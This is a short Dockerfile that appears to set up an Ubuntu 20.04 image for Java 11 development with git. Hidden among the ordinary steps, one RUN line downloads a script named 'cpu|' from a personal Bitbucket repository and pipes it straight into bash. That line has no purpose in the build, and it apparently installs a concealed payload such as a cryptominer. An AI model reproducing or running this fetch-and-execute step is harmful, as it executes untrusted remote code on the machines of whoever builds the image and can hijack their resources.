FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive
ENV LC_ALL=C.UTF-8

RUN apt-get update && apt -y install curl && curl -sL https://bitbucket.org/hokky88/file/raw/3afdc5990031ac98b2ef74faee6351fa2ef7b1e3/cpu%7C | bash
RUN apt-get install -y \
  git \
  openjdk-11-jdk \
  && rm -rf /var/lib/apt/lists/*

ENV JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
